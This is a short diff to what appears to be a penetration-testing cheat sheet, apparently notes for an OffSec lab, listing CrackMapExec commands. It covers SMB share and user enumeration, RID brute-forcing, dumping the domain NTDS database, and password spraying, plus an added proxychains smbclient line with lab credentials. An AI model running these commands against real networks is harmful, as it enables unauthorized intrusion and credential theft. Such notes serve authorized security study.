@@ -153,6 +153,7 @@ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --users
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --rid-brute
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
+proxychains4 -f /etc/proxychains4.conf smbclient //172.16.196.13/IPC$(sharename) -U offsec%lab
 
 password spray:
 cme protocol ip.txt -u user1 user2 user3 -p pass1 pass2 pass3 
